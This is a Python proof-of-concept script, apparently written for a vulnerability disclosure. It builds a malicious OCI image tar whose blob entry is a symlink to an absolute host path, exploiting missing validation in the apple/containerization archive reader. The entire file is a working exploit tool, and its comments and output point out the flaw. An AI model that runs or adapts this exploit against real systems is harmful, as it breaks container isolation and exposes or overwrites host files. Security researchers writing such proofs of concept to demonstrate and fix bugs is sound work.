#!/usr/bin/env python3
"""
create_malicious_tar.py
Builds a malicious OCI-layout tar for the apple/containerization symlink PoC.

Usage:
    python3 create_malicious_tar.py [--target TARGET_PATH] [--output OUTPUT_TAR]

Defaults:
    --target  /tmp/poc_outside_root/secret.txt
    --output  ./malicious_oci.tar
"""

import tarfile, io, json, time, argparse, os, sys

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="/tmp/poc_outside_root/secret.txt",
                    help="Absolute host path the symlink should point to")
    ap.add_argument("--output", default=os.path.join(os.path.dirname(__file__), "malicious_oci.tar"),
                    help="Output tar path")
    args = ap.parse_args()

    if not args.target.startswith("/"):
        print("ERROR: --target must be an absolute path (that is the vulnerability being demonstrated)")
        sys.exit(1)

    FAKE_DIGEST = "a" * 64

    OCI_LAYOUT = json.dumps({"imageLayoutVersion": "1.0.0"}).encode()
    OCI_INDEX = json.dumps({
        "schemaVersion": 2,
        "manifests": [{
            "mediaType": "application/vnd.oci.image.manifest.v1+json",
            "digest": f"sha256:{FAKE_DIGEST}",
            "size": 100,
            "annotations": {"com.apple.containerization.image.name": "poc:exploit"}
        }]
    }).encode()

    def reg(name, data):
        i = tarfile.TarInfo(name=name)
        i.size, i.mode, i.mtime, i.type = len(data), 0o644, int(time.time()), tarfile.REGTYPE
        return i, io.BytesIO(data)

    def directory(name):
        i = tarfile.TarInfo(name=name)
        i.size, i.mode, i.mtime, i.type = 0, 0o755, int(time.time()), tarfile.DIRTYPE
        return i, io.BytesIO(b"")

    def symlink_entry(name, target):
        # EXPLOIT: archive entry with absolute symlink target.
        # ArchiveReader.extractEntry() calls symlinkat(target, fd, name) with no validation.
        # ArchiveWriter.archive() would reject this (resolvedFull.starts(with: dirPath) check).
        i = tarfile.TarInfo(name=name)
        i.size, i.mode, i.mtime = 0, 0o777, int(time.time())
        i.type, i.linkname = tarfile.SYMTYPE, target  # absolute path — the bug
        return i, io.BytesIO(b"")

    with tarfile.open(args.output, "w:") as tf:
        tf.addfile(*reg("oci-layout", OCI_LAYOUT))
        tf.addfile(*reg("index.json", OCI_INDEX))
        tf.addfile(*directory("blobs/"))
        tf.addfile(*directory("blobs/sha256/"))
        tf.addfile(*symlink_entry(f"blobs/sha256/{FAKE_DIGEST}", args.target))

    print(f"[+] Created malicious OCI tar: {args.output}")
    print(f"[+] Exploit entry: blobs/sha256/{FAKE_DIGEST[:16]}... -> {args.target}")
    print(f"    archive_entry_symlink() will return: \"{args.target}\" (ABSOLUTE)")
    print(f"    ContainerizationArchive has NO check for absolute symlink targets.")

    # Verify
    with tarfile.open(args.output, "r:") as tf:
        print(f"\n[*] Tar contents:")
        for m in tf.getmembers():
            tag = " *** ABSOLUTE SYMLINK (exploit)" if (m.issym() and m.linkname.startswith("/")) else ""
            print(f"    {m.name}" + (f" -> {m.linkname}" if m.issym() else "") + tag)

if __name__ == "__main__":
    main()
